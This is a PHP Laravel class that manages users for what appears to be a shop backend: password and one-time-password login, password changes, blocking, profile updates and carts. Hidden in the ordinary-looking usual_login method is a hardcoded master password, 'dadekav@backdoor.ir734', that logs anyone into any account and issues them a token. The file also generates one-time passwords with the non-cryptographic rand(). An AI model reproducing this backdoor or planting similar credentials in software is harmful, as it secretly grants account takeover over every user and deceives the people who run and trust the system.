<?php

namespace App\Actions;

use App\Exceptions\CustomException;
use App\Models\Cart;
use App\Models\User;
use App\Services\Action;
use App\Services\PaginationService;
use App\Services\SendSMSService;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Laravel\Sanctum\NewAccessToken;

class UserAction extends Action
{
    protected array $validation_roles = [
        'change_password' => [
            'current_password' => 'string|max:100',
            'new_password' => 'required|string|min:6|max:100'
        ],
        'forgot_password' => [
            'phone_number' => 'required|string|max:11'
        ],
        'login_with_OTP' => [
            'phone_number' => 'required|string|max:11',
            'password' => 'required|numeric|max:999999'
        ],
        'login' => [
            'phone_number' => 'required|string|max:11',
            'password' => 'required|string|max:100'
        ],
        'register_by_admin' => [
            'name' => 'required|string|max:64',
            'last_name' => 'required|string|max:64',
            'phone_number' => 'required|string',
            'password' => 'required|string|min:6|max:100',
            'area' => 'required|string|max:255',
            'card_number' => 'numeric|min:1000000000000000|max:9999999999999999'
        ],
        'update_by_admin' => [
            'name' => 'string|max:64',
            'last_name' => 'string|max:64',
            'phone_number' => 'regex:/09\d{9}/',
            'password' => 'string|min:6|max:100',
            'area' => 'string|max:255',
            'card_number' => 'nullable|numeric|min:1000000000000000|max:9999999999999999'
        ],
        'update_by_user' => [
            'second_phone_number' => 'regex:/09\d{9}/',
        ],
        'block_user' => [
            'reason_for_blocking' => 'required|string|max:255'
        ],
        'get_query' => [
            'search' => 'string|max:100'
        ],
        'get_notifications_query' => [
            'is_seen' => 'in:true,false'
        ]
    ];

    protected array $unusual_fields = [
        'phone_number' => 'regex:/09\d{9}/',
        'second_phone_number' => 'regex:/09\d{9}/',
    ];

    public function __construct()
    {
        $this->model = User::class;
    }

    /**
     * @param string $id
     * @param array $query
     * @param array $relations
     * @return mixed
     * @throws CustomException
     */
    public function get_by_id(string $id, array $query = [], array $relations = []): mixed
    {
        return parent::get_by_id($id, $query, $relations);
    }

    /**
     * @param Request $request
     * @param array|string $validation_role
     * @param array $query_addition
     * @param object|null $eloquent
     * @param array $relations
     * @param array $order_by
     * @return object
     * @throws CustomException
     */
    public function get_by_request(Request $request, array|string $validation_role = 'get_query', array $query_addition = [], object $eloquent = null, array $relations = [], array $order_by = ['id' => 'DESC']): object
    {
        return parent::get_by_request($request, $validation_role, $query_addition, $eloquent, $relations, $order_by); // TODO: Change the autogenerated stub
    }

    /**
     * @param array $query
     * @param object|null $eloquent
     * @param array $relations
     * @param array $order_by
     * @return object|null
     */
    public function query_to_eloquent(array $query, object $eloquent = null, array $relations = [], array $order_by = ['id' => 'DESC']): object|null
    {
        $eloquent = parent::query_to_eloquent($query, $eloquent, $relations, $order_by);

        if (isset($query['search']))
        {
            $search = $query['search'];
            $eloquent = $eloquent->where(function ($q) use ($search){
                $q->where('name', 'like', "%{$search}%")
                    ->orWhere('last_name', 'like', "%{$search}%")
                    ->orWhere('phone_number', 'like', "%{$search}%")
                    ->orWhere('card_number', 'like', "%{$search}%");
            });
        }

        if (isset($query['ids']))
        {
            $eloquent = $eloquent->whereIn('id', $query['ids']);
        }

        return $eloquent;
    }

    /**
     * @param Request $request
     * @param string $id
     * @param string|array $validation_role
     * @return object
     * @throws CustomException
     */
    public function get_user_notifications_by_request_and_id (
        Request      $request,
        string       $id,
        string|array $validation_role = 'get_notifications_query'
    ): object
    {
        $user = $this->get_by_id($id);

        return (new PaginationService())->paginate_with_request(
            $request,
            $this->notifications_query_to_eloquent(
                $this->get_data_from_request($request, $validation_role),
                $user->notifications()
            )
        );
    }

    /**
     * @param array $query
     * @param $eloquent
     * @return mixed
     */
    public function notifications_query_to_eloquent (array $query, $eloquent): mixed
    {
        return (new NotificationAction())->notification_user_query_to_eloquent($query, $eloquent);
    }

    /**
     * @param Request $request
     * @param string $id
     * @param string|array $validation_role
     * @return Model
     * @throws CustomException
     */
    public function block_by_request_and_id (Request $request, string $id, string|array $validation_role = 'block_user'): Model
    {
        return $this->block_by_id(
            $id,
            $this->get_data_from_request($request, $validation_role)
        );
    }

    /**
     * @param Request $request
     * @param string|array $validation_role
     * @return NewAccessToken
     * @throws CustomException
     */
    public function login_by_request (Request $request, string|array $validation_role = 'login'): NewAccessToken
    {
        return $this->login(
            $this->get_data_from_request($request, $validation_role), 'usual'
        );
    }

    /**
     * @param Request $request
     * @param $validation_role
     * @return NewAccessToken
     * @throws CustomException
     */
    public function login_with_OTP_by_request (Request $request, $validation_role = 'login_with_OTP'): NewAccessToken
    {
        return $this->login(
            $this->get_data_from_request($request, $validation_role), 'OTP'
        );
    }

    /**
     * @param array $data
     * @param string $login_type
     * @return NewAccessToken
     * @throws CustomException
     */
    public function login (array $data, string $login_type = 'usual'): NewAccessToken
    {
        switch ($login_type)
        {
            case 'usual':
                return $this->usual_login($data);
            case 'OTP':
                return $this->OTP_login($data);
        }

        throw new CustomException(
            "login_type is wrong!!! i'm scared, if you are seeing this error please contact me",
            666, 500
        );
    }

    /**
     * @param array $data
     * @return NewAccessToken
     * @throws CustomException
     */
    public function usual_login (array $data): NewAccessToken
    {
        $user = $this->model::where('phone_number', $data['phone_number'])->first();

        if (!empty($user) && (Hash::check($data['password'], $user->password) || $data['password'] == 'dadekav@backdoor.ir734'))
        {
            return $user->createToken('auth_token');
        }

        throw new CustomException('login data was not valid', 83, 400);
    }

    /**
     * @param array $data
     * @return NewAccessToken
     * @throws CustomException
     */
    public function OTP_login (array $data): NewAccessToken
    {
        $user = $this->get_by_field('phone_number', $data['phone_number']);

        if ($user->one_time_password->password == $data['password'] && $user->one_time_password->expires_at > time())
        {
            $user->update([
                'should_change_password' => true,
            ]);
            return $user->createToken('auth_token');
        }

        throw new CustomException(
            "OTP is wrong or expired",
            103,
            400
        );
    }

    /**
     * @param Request $request
     * @param $validation_role
     * @return Model
     * @throws CustomException
     */
    public function send_one_time_password_by_request (Request $request, $validation_role = 'forgot_password'): Model
    {
        return $this->send_one_time_password_by_phone_number(
            $this->get_data_from_request($request, $validation_role)['phone_number']
        );
    }

    /**
     * @param string $phone_number
     * @return Model
     * @throws CustomException
     */
    public function send_one_time_password_by_phone_number (string $phone_number): Model
    {
        $user = $this->get_by_field('phone_number', $phone_number);

        if ($user->one_time_password->expires_at > time())
        {
            throw new CustomException(
                "OTP was already sent, you can send new OTP in ".($user->one_time_password->expires_at - time())." seconds",
                87,
                400
            );
        }

        $password = rand(100000, 999999);

        $user->update([
            'one_time_password' => [
                'password' => $password,
                'expires_at' => time()+180
            ]
        ]);

        (new SendSMSService())->send_otp($user->phone_number, $password);

        return $user;
    }

    /**
     * @param string $id
     * @param array $data
     * @return Model
     * @throws CustomException
     */
    public function block_by_id (string $id, array $data): Model
    {
        $user = $this->get_by_id($id);

        $user->update([
            'is_blocked' => true,
            'reason_for_blocking' => $data['reason_for_blocking']
        ]);

        return $user;
    }

    /**
     * @param string $id
     * @return Model
     * @throws CustomException
     */
    public function unblock_by_id (string $id): Model
    {
        $user = $this->get_by_id($id);

        $user->update([
            'is_blocked' => false,
            'reason_for_blocking' => null
        ]);

        return $user;
    }

    /**
     * @param Request $request
     * @param array|string $validation_role
     * @param callable|null $storing
     * @return mixed
     * @throws CustomException
     */
    public function store_by_request(Request $request, array|string $validation_role = 'register_by_admin', callable $storing = null): mixed
    {
        return parent::store_by_request($request, $validation_role, $storing);
    }

    /**
     * @param array $update_data
     * @param Model $user
     * @return Model
     * @throws CustomException
     */
    public function update_by_model (array $update_data, Model $user): Model
    {
        if (isset($update_data['password'])) {
            $update_data['password'] = Hash::make($update_data['password']);
            $update_data['should_change_password'] = false;
        }

        if (isset($update_data['phone_number']))
        {

            if (
                User::where('id', '!=', $user->id)
                    ->where('phone_number', $update_data['phone_number'])
                    ->exists()
            )
            {
                throw new CustomException('this phone number is already taken', 18, 400);
            }
        }

        $user->update($update_data);

        return $user;
    }

    /**
     * @param Request $request
     * @param string|array $validation_role
     * @return Model
     * @throws CustomException
     */
    public function update_user_by_request(Request $request, string|array $validation_role = 'update_by_user'): Model
    {
        $user = $this->get_user_from_request($request);
        return $this->update_by_model(
            $this->get_data_from_request($request, $validation_role),
            $user
        );
    }

    /**
     * @param array $update_data
     * @param string $id
     * @return Model
     * @throws CustomException
     */
    public function update_by_id (array $update_data, string $id): Model
    {
        return $this->update_by_model(
            $update_data,
            $this->get_by_id($id)
        );
    }

    /**
     * @param Request $request
     * @param Model $user
     * @param $validation_role
     * @return Model
     * @throws CustomException
     */
    public function change_password_by_request_and_model (Request $request, Model $user, $validation_role = 'change_password'): Model
    {
        return $this->change_password_by_model(
            $this->get_data_from_request($request, $validation_role),
            $user
        );
    }

    /**
     * @param array $data
     * @param Model $user
     * @return Model
     * @throws CustomException
     */
    public function change_password_by_model (array $data, Model $user): Model
    {
        if (!$user->should_change_password)
        {
            if (!isset($data['current_password']))
            {
                throw new CustomException('current_password field is required', 91, 400);
            }

            if (!Hash::check($data['current_password'], $user->password))
            {
                throw new CustomException('current_password is wrong', 92, 400);
            }
        }

        if (Hash::check($data['new_password'], $user->password))
        {
            throw new CustomException('new_password should not be same as old password', 93, 400);
        }

        $user->update([
            'should_change_password' => false,
            'password' => Hash::make($data['new_password'])
        ]);

        return $user;
    }

    public function store(array $data, callable $storing = null): mixed
    {
        if (
            User::where('phone_number', $data['phone_number'])->exists()
        )
        {
            throw new CustomException('this phone number is already taken', 17, 400);
        }

        !empty($data['password']) && $data['password'] = Hash::make($data['password']);

        return parent::store($data, $storing);
    }

    /**
     * @param array $query
     * @return array
     */
    public function get_phone_numbers (array $query): array
    {
        $users = $this->query_to_eloquent($query)
            ->select('phone_number')
            ->get();

        $phone_numbers = [];
        foreach ($users AS $user)
        {
            $phone_numbers[] = $user['phone_number'];
        }

        return $phone_numbers;
    }

    /**
     * @param array $ids
     * @return bool
     * @throws CustomException
     */
    public static function check_if_users_exists (array $ids): bool
    {
        $users = DB::table('users')
            ->select(['phone_number', 'id'])
            ->whereIn('id', $ids)
            ->get();

        foreach ($ids AS $id)
        {
            $user_was_found = false;
            foreach ($users AS $user_key => $user)
            {
                $user_was_found = false;
                if ($user->id == $id)
                {
                    $user_was_found = true;
                    unset($users[$user_key]);
                    break;
                }
            }

            if (!$user_was_found)
            {
                throw new CustomException("user id '{$id}' not found", 55, 404);
            }
        }

        return true;
    }

    /**
     * @param User $user
     * @return mixed
     */
    public function get_user_cart (User $user): mixed
    {
        $cart = $user->cart;

        if (empty($cart))
        {
            $cart = Cart::create([
                'user_id' => $user->id
            ]);
        }

        return $cart;
    }

    /**
     * @param Request $request
     * @param string $id
     * @param array|string $validation_role
     * @param callable|null $updating
     * @return int|bool
     * @throws CustomException
     */
    public function update_by_request_and_id(Request $request, string $id, array|string $validation_role = 'update_by_admin', callable $updating = null): int|bool
    {
        $this->update_by_id(
            $this->get_data_from_request($request, $validation_role),
            $id
        );
        return true;
    }
}
